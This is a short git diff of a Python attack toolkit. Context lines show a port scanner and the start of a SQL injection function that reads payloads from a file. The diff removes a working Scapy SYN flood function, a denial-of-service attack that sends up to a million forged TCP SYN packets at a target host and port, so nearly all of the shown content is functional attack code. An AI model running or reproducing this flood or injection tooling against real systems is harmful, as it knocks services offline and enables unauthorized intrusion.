@@ -156,19 +156,6 @@ def port_scanner(src_ip="127.0.0.1", target_ip="127.0.0.1", src_port=1024, desti
         current_port = current_port + 1
 
 
-# Option 1 - Conduct Denial of Service Attack
-def syn_flood(target_ip, target_port, packets_send=1000000):
-    count = 0
-    print("START SYN_FLOOD")
-    while count < packets_send:
-        # Creates the packet and assigns it to variable a
-        a = IP(src="127.0.0.1", dst=target_ip)/TCP(flags="S", sport=RandShort(), dport=int(target_port))
-        send(a)  # Sends the Packet
-        count = count + 1
-        # print(str(count) + " Packets Sent")
-    print("END_SYN_FLOOD")
-
-
 # Option 3 - SQL Inject
 def sql_inject(host, target_path, sql_attacks="sql_attack.txt"):
     with open(sql_attacks) as fd:
